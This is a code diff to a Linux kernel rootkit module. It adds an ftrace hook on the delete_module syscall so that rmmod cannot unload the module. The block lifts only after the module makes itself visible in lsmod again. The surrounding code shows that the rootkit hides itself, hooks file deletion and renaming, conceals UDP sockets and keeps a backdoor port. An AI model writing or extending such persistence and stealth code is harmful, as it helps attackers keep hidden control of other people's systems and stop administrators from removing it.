@@ -101,6 +101,12 @@ typedef asmlinkage long (*orig_renameat2_t)(const struct pt_regs *);
 static orig_unlinkat_t orig_unlinkat;
 static orig_renameat2_t orig_renameat2;
 
+/* === rmmod self-protection === */
+static struct ftrace_hook delete_module_hook;
+typedef asmlinkage long (*orig_delete_module_t)(const struct pt_regs *);
+static orig_delete_module_t orig_delete_module;
+static bool allow_unload = false;
+
 /* === UDP hiding === */
 #ifdef CONFIG_NET
 static struct ftrace_hook udp_seq_hook;
@@ -143,6 +149,8 @@ static void show_module(void)
         return;
     list_add(&THIS_MODULE->list, saved_module_list);
     module_hidden = false;
+    /* Re-appearing is the companion's signal that rmmod is coming — open the gate. */
+    allow_unload = true;
     pr_info("rootkit: module visible again in lsmod\n");
 }
 
@@ -329,6 +337,23 @@ static asmlinkage long new_renameat2(const struct pt_regs *regs)
         }
     }
     return orig_renameat2(regs);
+}
+
+/* ============================================================
+ * Feature: rmmod self-protection — block delete_module on us
+ * ============================================================ */
+static asmlinkage long new_delete_module(const struct pt_regs *regs)
+{
+    const char __user *user_name = (const char __user *)regs->di;
+    char kname[MODULE_NAME_LEN] = {0};
+
+    if (rk_active && !allow_unload && user_name) {
+        if (strncpy_from_user(kname, user_name, sizeof(kname) - 1) > 0) {
+            if (strcmp(kname, THIS_MODULE->name) == 0)
+                return -EBUSY;
+        }
+    }
+    return orig_delete_module(regs);
 }
 
 /* ============================================================
@@ -1202,6 +1227,45 @@ static void uninstall_rename_hook(void)
         ftrace_set_filter_ip(&rename_hook.ops, rename_hook.address, 1, 0);
 }
 
+static int install_delete_module_hook(kallsyms_lookup_name_t lookup)
+{
+    int ret;
+
+    delete_module_hook.name = "__x64_sys_delete_module";
+    delete_module_hook.function = new_delete_module;
+    delete_module_hook.original = &orig_delete_module;
+    delete_module_hook.address = lookup(delete_module_hook.name);
+
+    if (!delete_module_hook.address) {
+        pr_err("[-] Symbol not found: __x64_sys_delete_module\n");
+        return -ENOENT;
+    }
+    pr_info("[+] __x64_sys_delete_module @ 0x%lx\n", delete_module_hook.address);
+    orig_delete_module = (orig_delete_module_t)delete_module_hook.address;
+
+    delete_module_hook.ops.func = hook_callback;
+    delete_module_hook.ops.flags = FTRACE_OPS_FL_SAVE_REGS | FTRACE_OPS_FL_IPMODIFY;
+
+    ret = ftrace_set_filter_ip(&delete_module_hook.ops, delete_module_hook.address, 0, 0);
+    if (ret) return ret;
+
+    ret = register_ftrace_function(&delete_module_hook.ops);
+    if (ret) {
+        ftrace_set_filter_ip(&delete_module_hook.ops, delete_module_hook.address, 1, 0);
+        delete_module_hook.ops.func = NULL;
+        return ret;
+    }
+    return 0;
+}
+
+static void uninstall_delete_module_hook(void)
+{
+    if (delete_module_hook.ops.func)
+        unregister_ftrace_function(&delete_module_hook.ops);
+    if (delete_module_hook.address)
+        ftrace_set_filter_ip(&delete_module_hook.ops, delete_module_hook.address, 1, 0);
+}
+
 #ifdef CONFIG_NET
 static int install_udp_hook(kallsyms_lookup_name_t lookup)
 {
@@ -1326,6 +1390,7 @@ static int install_hook(void)
 #ifdef CONFIG_NET
     install_udp_hook(lookup);
 #endif
+    install_delete_module_hook(lookup);
     return 0;
 }
 
@@ -1964,6 +2029,7 @@ static void __exit rootkit_exit(void)
 #ifdef CONFIG_NET
     uninstall_udp_hook();
 #endif
+    uninstall_delete_module_hook();
     #ifdef CONFIG_NET
     close_backdoor_port();
     #endif
